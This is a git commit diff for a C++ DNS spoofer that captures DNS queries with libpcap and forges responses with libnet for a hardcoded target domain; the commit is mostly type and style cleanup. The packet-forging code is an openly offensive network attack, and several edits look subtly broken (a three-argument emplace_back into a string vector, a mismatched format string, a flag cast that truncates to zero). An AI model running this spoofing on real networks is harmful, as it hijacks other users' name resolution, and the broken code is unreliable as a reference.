882ff8d94f940474038b645b23c9d53b08ee01c2
wiekonek <wiekonek@gmail.com>
2017-09-26 12:59:57 +0200

    Make some cleaning

--- DnsSpoofer.cpp
+++ DnsSpoofer.cpp
@@ -10,21 +10,13 @@
 using std::for_each;
 using std::string;
 
-struct dnsquery {
-    char *qname;
-    char qtype[2];
-    char qclass[2];
-};
-
-DnsSpoofer::DnsSpoofer() {
-
-}
+DnsSpoofer::DnsSpoofer() = default;
 
 void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);
-vector<string> get_domain_name(unsigned char *query_payload);
+vector<string> get_domain_name(const unsigned char *query_payload);
 
 void DnsSpoofer::start_spoofing(char *device) {
-    struct bpf_program fp;
+    struct bpf_program fp{};
     bpf_u_int32 netp, maskp;
     _errbuf = (char*)malloc(PCAP_ERRBUF_SIZE);
     pcap_t *pcap = pcap_create(device, _errbuf);
@@ -41,10 +33,10 @@ void DnsSpoofer::start_spoofing(char *device) {
         cout << "ap_setfilter()" << endl;
         exit(EXIT_FAILURE);
     }
-    pcap_loop(pcap, -1, handle_dns_packet, NULL);
+    pcap_loop(pcap, -1, handle_dns_packet, nullptr);
 }
 
-vector<string> get_domain_name(unsigned char *query_payload) {
+vector<string> get_domain_name(const unsigned char *query_payload) {
     vector<string> domain_name;
     for(int i = 0; ; ) {
         int current_length = query_payload[i++];
@@ -57,7 +49,7 @@ vector<string> get_domain_name(unsigned char *query_payload) {
             for(int j = 0; j < current_length; j++) {
                 domain_segment[j] = query_payload[i++];
             }
-            domain_name.push_back(reinterpret_cast<char*>(domain_segment));
+            domain_name.emplace_back(reinterpret_cast<char*>(domain_segment));
         }
     }
     return domain_name;
@@ -67,9 +59,7 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
 
     //TODO: Move this to program config or args
     vector<string> spoof_target;
-    spoof_target.push_back("wiekon");
-    spoof_target.push_back("com");
-    spoof_target.push_back("pl");
+    spoof_target.emplace_back("wiekon", "com", "pl");
 
     auto incoming_ethernet_header = (struct ethhdr *) bytes;
     auto incoming_ip_header = (struct iphdr*)(bytes + sizeof(struct ethhdr));
@@ -87,7 +77,7 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
 
     cout << (dns_qr(incoming_dns_header ) > 0 ? "[REQ]" : "[RES]") << " id: 0x"<< std::hex << dns_qid(incoming_dns_header ) << ", query: ";
     auto domain_name_segments = get_domain_name(dns_payload(incoming_dns_header ));
-    for(auto segment: domain_name_segments) {
+    for(auto & segment: domain_name_segments) {
         cout << segment << ".";
     }
     cout <<  endl;
@@ -106,17 +96,14 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
             if(spoof) {
                 cout << "Spoofing!" << endl;
                 char err_buf[LIBNET_ERRBUF_SIZE];
-                auto libnet_context = libnet_init(LIBNET_LINK, NULL, err_buf);
-
-                uint32_t my_ip = libnet_get_ipaddr4(libnet_context);
-                libnet_ether_addr *my_mac = libnet_get_hwaddr(libnet_context);
+                auto libnet_context = libnet_init(LIBNET_LINK, nullptr, err_buf);
 
                 //TODO: xD way there, just for tests
                 char payload[1024];
                 auto payload_s = snprintf(
                         payload,
                         sizeof payload,
-                        "%c%s%c%s%c%c%c%c%c%c%c",
+                        "%c%s%c%s%c%s%c%c%c%c%c",
                         (char)strlen("wiekon"),
                         "wiekon",
                         (char)strlen("com"),
@@ -132,14 +119,14 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
 
                 auto tag = libnet_build_dnsv4(
                         LIBNET_UDP_DNSV4_H, //const size of dns header - 12
-                        dns_qid(incoming_dns_header ), // transaction id
-                        0 | (1 << 16), // flags (set only first -> first indicate response)
+                        (uint16_t)dns_qid(incoming_dns_header ), // transaction id
+                        (uint16_t)(0 | (1 << 16)), // flags (set only first -> first indicate response)
                         1 /*dns_numqd(dns)*/, // question number
                         0 /*dns_numan(dns)*/, // answer RR number
                         0, // auth RR number
                         0, // additional RR number
                         (const uint8_t*)payload, // payload
-                        payload_s, // payload size
+                        (uint32_t)payload_s, // payload size
                         libnet_context,
                         0 // tag, 0 -> to create new header
                 );
@@ -151,9 +138,9 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 tag = libnet_build_udp(
                         incoming_udp_header->uh_dport, // source port
                         incoming_udp_header->uh_sport, // destination port
-                        LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s, // length
+                        (uint16_t)(LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s), // length
                         0, // checksum
-                        NULL, // payload,
+                        nullptr, // payload,
                         0, // payload size
                         libnet_context,
                         0 // tag, 0 -> to create new header
@@ -163,16 +150,16 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 }
 
                 tag = libnet_build_ipv4 (
-                        LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s,	// length
-                        incoming_ip_header->tos, // tos NIE WIEM XD
-                        incoming_ip_header->id, // id
+                        (uint16_t)(LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s),	// length
+                        (uint8_t)incoming_ip_header->tos, // tos NIE WIEM XD
+                        (uint16_t)incoming_ip_header->id, // id
                         0, // fragment
-                        incoming_ip_header->ttl, // time to live
+                        (uint8_t)incoming_ip_header->ttl, // time to live
                         IPPROTO_UDP, // upper layer protocol
                         0, // checksum
                         incoming_ip_header->daddr,		//Src IP
                         incoming_ip_header->saddr,		//Dst IP
-                        NULL, // payload
+                        nullptr, // payload
                         0, // payload size
                         libnet_context,
                         0 // package tag, 0 -> to create new header
